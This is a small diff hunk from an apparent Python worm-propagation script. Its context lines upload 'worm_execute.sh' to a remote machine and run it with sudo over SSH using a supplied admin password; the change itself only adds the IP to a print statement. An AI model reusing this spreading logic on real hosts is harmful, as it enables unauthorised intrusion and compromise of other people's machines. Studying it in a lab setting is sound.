@@ -42,7 +42,7 @@ if __name__ == '__main__':
                 ftp_client.put(execute_file_path, "worm_execute.sh")
                 ftp_client.close()
 
-                print("\nVM: " + username)
+                print("\nVM: " + username + "\t" + ip)
                 stdin, stdout, stderr = ssh_client.exec_command("sudo bash ./worm_execute.sh", get_pty=True)
                 stdin.write(admin_password + "\n")
                 print("STDOUT")
